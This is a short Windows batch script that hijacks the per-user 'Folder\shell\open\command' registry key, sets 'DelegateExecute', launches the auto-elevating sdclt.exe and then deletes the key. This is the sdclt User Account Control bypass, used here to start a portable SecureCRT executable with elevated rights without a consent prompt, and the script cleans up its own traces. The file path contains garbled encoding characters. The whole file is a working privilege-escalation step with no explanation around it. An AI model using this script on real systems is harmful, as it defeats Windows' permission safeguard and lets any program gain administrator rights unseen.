reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c F:\≥£”√\SecureCRSecureFX_x64\SecureCRTPortable.exe" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
timeout /t 5
%windir%\system32\sdclt.exe
timeout /t 5
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f


